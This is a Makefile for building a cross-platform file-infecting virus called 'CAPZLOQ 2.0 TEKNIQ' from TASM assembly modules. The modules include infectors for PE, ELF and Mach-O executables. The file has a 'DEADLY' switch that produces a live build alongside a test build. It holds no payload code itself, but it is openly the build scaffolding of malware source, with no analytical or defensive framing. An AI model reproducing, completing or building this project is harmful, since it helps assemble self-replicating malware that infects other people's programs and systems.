#   Make file for CAPZLOQ 2.0 TEKNIQ Virus
#   Copyright (c) 2013 J-FUQING-PANIC
#
#       make -B                     Build clt20.exe
#       make -B -DDEBUG             Build debug clt20.exe
#       make -B -DDEADLY            Build clt20-deadly.ex_
#       make -B -DDEADLY -DDEBUG    Build debug clt20-deadly.ex_
#       make tools		    Build .\tools binaries
#	make clean		    Remove obj,lst,map,ex? files,infected samples

.autodepend

NAME = CLT20

!if $d(DEADLY)
EXENAME = $(NAME)-DEADLY
EXE_EXTENSION  = EX_
TARGET_DIR = DEADLY
TASMDEADLY = /dDEADLY=1
!else
EXENAME = $(NAME)
EXE_EXTENSION = EXE
TARGET_DIR = TEST
TASMDEADLY=
!endif

TOOL_TARGET_DIR = .\tools

#NAME = CLT20
# Base VA of first gen virus.
VBase = 400000

# Modules in order of linking.
OBJS =  $(TARGET_DIR)\vmain.obj\
        $(TARGET_DIR)\osprocs.obj\
	$(TARGET_DIR)\win32-procs.obj\
	$(TARGET_DIR)\linux-procs.obj\
	$(TARGET_DIR)\osx-procs.obj\
	$(TARGET_DIR)\strhash32.obj\
	$(TARGET_DIR)\rand.obj\ 
	$(TARGET_DIR)\inf-pe.obj\
	$(TARGET_DIR)\inf-elf.obj\
	$(TARGET_DIR)\inf-macho.obj\
        $(TARGET_DIR)\vhost.obj

# Executable Definition file.
DEF  = $(EXENAME).def

# Path of TASM Installation and other tools
TASMPATH = .\bin
BINPATH = .\bin

# Optional Debug parameters.
!if $d(DEBUG)
TASMDEBUG=/zi
LINKDEBUG=-v
!else
TASMDEBUG=/zn
LINKDEBUG=
!endif

# Utilities used.
TASM = $(TASMPATH)\tasm32
TLINK = $(TASMPATH)\tlink32

# The main target - CAPZLOQ TEKNIQ VIRUS 2.0
$(EXENAME).$(EXE_EXTENSION): $(OBJS) $(DEF)
  # Build linker response file.
  echo $(LINKDEBUG) -c -m -Tpe -B:$(VBase) + > lnkresp
  echo $(TARGET_DIR)\vmain.obj + >> lnkresp
  echo $(TARGET_DIR)\osprocs.obj + >> lnkresp
  echo $(TARGET_DIR)\win32-procs.obj + >> lnkresp
  echo $(TARGET_DIR)\linux-procs.obj + >> lnkresp
  echo $(TARGET_DIR)\osx-procs.obj + >> lnkresp
  echo $(TARGET_DIR)\strhash32.obj + >> lnkresp
  echo $(TARGET_DIR)\rand.obj + >> lnkresp
  echo $(TARGET_DIR)\inf-pe.obj + >> lnkresp
  echo $(TARGET_DIR)\inf-elf.obj + >> lnkresp
  echo $(TARGET_DIR)\inf-macho.obj + >> lnkresp
  echo $(TARGET_DIR)\vhost.obj, + >> lnkresp
  echo $(EXENAME).$(EXE_EXTENSION), $(EXENAME), .\bin\import32, $(DEF) >> lnkresp
  $(TLINK) @lnkresp
  del lnkresp
  find "VHost" $(EXENAME).map

$(TARGET_DIR)\vmain.obj: .\vmain.asm
$(TARGET_DIR)\osprocs.obj: .\osprocs.asm
$(TARGET_DIR)\win32-procs.obj: .\win32-procs.asm
$(TARGET_DIR)\linux-procs.obj: .\linux-procs.asm
$(TARGET_DIR)\osx-procs.obj: .\osx-procs.asm
$(TARGET_DIR)\strhash32.obj: .\strhash32.asm 
$(TARGET_DIR)\rand.obj: .\rand.asm
$(TARGET_DIR)\inf-pe.obj: .\inf-pe.asm
$(TARGET_DIR)\inf-elf.obj: .\inf-elf.asm
$(TARGET_DIR)\inf-macho.obj: .\inf-macho.asm
$(TARGET_DIR)\vhost.obj: .\vhost.asm

$(TOOL_TARGET_DIR)\strhash32.exe: $(TOOL_TARGET_DIR)\strhash32.c
$(TOOL_TARGET_DIR)\dumpmod.exe: $(TOOL_TARGET_DIR)\dumpmod.c
$(TOOL_TARGET_DIR)\maxphdrs: $(TOOL_TARGET_DIR)\maxphdrs.c

tools: $(TOOL_TARGET_DIR)\strhash32.exe $(TOOL_TARGET_DIR)\dumpmod.exe $(TOOL_TARGET_DIR)\maxphdrs.exe

# Clean-up directory.
clean:
 -del *.ex?
 -del *.obj
 -del *.map
 -del *.lst
 -del deadly\*.lst
 -del deadly\*.obj
 -del test\*.lst
 -del test\*.obj
 -del $(TOOL_TARGET_DIR)\*.exe
 -del samples\r*
 -del samples\infectedsamples\s*
 
# Assembly rule.
.asm.obj:
  $(TASM) $(TASMDEBUG) $(TASMDEADLY) /dVBase=$(VBase)h /ml /m9 /l /n /c /t $&.asm, $@, $(TARGET_DIR)\\$&.lst

.c.exe:
  gcc -o $@ $<
